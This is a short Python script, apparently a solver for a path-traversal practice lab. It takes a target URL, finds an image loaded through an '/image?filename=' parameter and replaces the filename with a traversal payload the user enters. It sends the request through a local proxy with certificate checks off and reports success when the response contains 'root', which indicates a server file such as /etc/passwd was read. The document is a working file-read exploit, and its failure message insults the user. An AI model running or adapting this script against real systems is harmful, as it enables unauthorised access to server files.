import requests
import sys
from bs4 import BeautifulSoup
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


url=sys.argv[1]
proxies = {
    'http': 'http://127.0.0.1:8080',  
    'https': 'http://127.0.0.1:8080'  
}
response=requests.get(url,proxies=proxies,verify=False)
# print(response.text)
soup=BeautifulSoup(response.text,'html.parser')
img_tag=soup.find_all('img')
# print("\n",img_tag)

jpg=0
for img in img_tag:
    src=img.get('src')
    if 'jpg' in src.lower():
        jpg=img
        break

# Removing the <> and ""
print(jpg)
payload=input("Enter the payload:")
if '/image?filename=' in jpg['src']:
    jpg['src'] = jpg['src'].replace(jpg['src'].split('=')[-1], payload)
    jpg['src'] = jpg['src'].replace('<', '').replace('>', '').replace('"', '')

new_url=f"{url}{jpg['src']}"
print(new_url)

new_request=requests.get(new_url,proxies=proxies,verify=False)
time.sleep(1)
print(new_request.text)
if "root" in new_request.text:
    print("Completed")
else:
    print("You idiot!!!!!!")
